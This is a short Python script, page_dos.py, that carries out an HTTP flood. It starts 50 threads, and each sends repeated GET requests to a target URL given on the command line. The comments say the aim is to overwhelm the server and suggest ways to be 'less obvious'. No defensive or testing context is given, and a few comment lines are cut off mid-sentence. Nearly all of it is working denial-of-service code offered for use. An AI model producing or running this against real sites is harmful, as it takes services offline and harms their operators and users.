#!/usr/bin/env python3
# page_dos.py
# Usage: python3 page_dos.py http://example.com/target-page.php

import requests
import threading
import sys
import time

# Target URL from command line argument
if len(sys.argv) != 2:
    print("Usage: python3 page_dos.py <target-url>")
    sys.exit(1)

url = sys.argv[1]
requests_per_second = 50  # Adjust this based on your network and the server's >
stop_flag = False

def attack():
    global stop_flag
    while not stop_flag:
        try:
            # Send a request. Use 'verify=False' if it has a bad SSL cert, but >
            response = requests.get(url, timeout=5)
            print(f"Request sent. Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            # This is expected - the goal is to overwhelm it
            print(f"Error (likely expected): {e}")
        # time.sleep(0.1) # Uncomment to slightly slow down and be less obvious

print(f"[+] Starting HTTP flood on {url}")
print("[+] Press Ctrl+C to stop the attack.")

# Create and start multiple threads
threads = []
for i in range(requests_per_second):
    t = threading.Thread(target=attack)
    t.daemon = True
    threads.append(t)
    t.start()

# Wait for a keyboard interrupt
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopping attack...")
    stop_flag = True
    for t in threads:
        t.join()  # Wait for all threads to finish
    print("[+] Attack stopped.")